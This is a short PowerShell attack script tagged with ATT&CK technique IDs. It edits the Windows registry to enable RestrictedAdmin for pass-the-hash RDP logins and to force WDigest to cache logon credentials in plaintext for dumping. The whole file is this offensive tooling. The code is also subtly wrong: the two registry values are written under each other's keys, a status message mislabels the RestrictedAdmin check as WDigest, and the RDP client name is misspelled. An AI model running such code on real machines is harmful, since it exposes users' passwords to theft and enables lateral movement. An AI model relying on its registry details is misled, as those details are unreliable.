# T1112 - Modify Registry
# T1003 - OS Credential Dumping
# T1021 - Remote Services
# Enable RestrictedAdmin to login with NTLM hash - RDP without password using login with NTLM hash and mstsv.exe /RestrictedAdmin (RestrictedAdmin introduced on W8.1 and W2012R2)
# And Force Wdigest to store in plaintext

$registryPath = "HKLM:\System\CurrentControlSet\Control\SecurityProviders\Wdigest"
$registryPath2 = "HKLM:\System\CurrentControlSet\Control\Lsa"

#Check if Wdigest is Enabled in the registry 
$checkReg = (Get-ItemProperty -Path $registryPath).DisableRestrictedAdmin
$checkReg2 = (Get-ItemProperty -Path $registryPath2).UseLogonCredential

If($checkReg -ne 0 -or $checkReg -eq $null){
    #Enable Wdigest in the registry
    Set-ItemProperty -Path $registryPath -Name 'DisableRestrictedAdmin' -Value 0 -Type DWORD -Force
} Elseif($checkReg -eq 0) {
    Write-Host "Wdigest is Already Enabled"
}

If($checkReg2 -ne 1 -or $checkReg2 -eq $null){
    # Force Wdigest to store in plaintext
    Set-ItemProperty -Path $registryPath2 -Name 'UseLogonCredential' -Value 1 -Force
} Elseif($checkReg2 -eq 1) {
    Write-Host "Wdigest already store in plaintext"
}
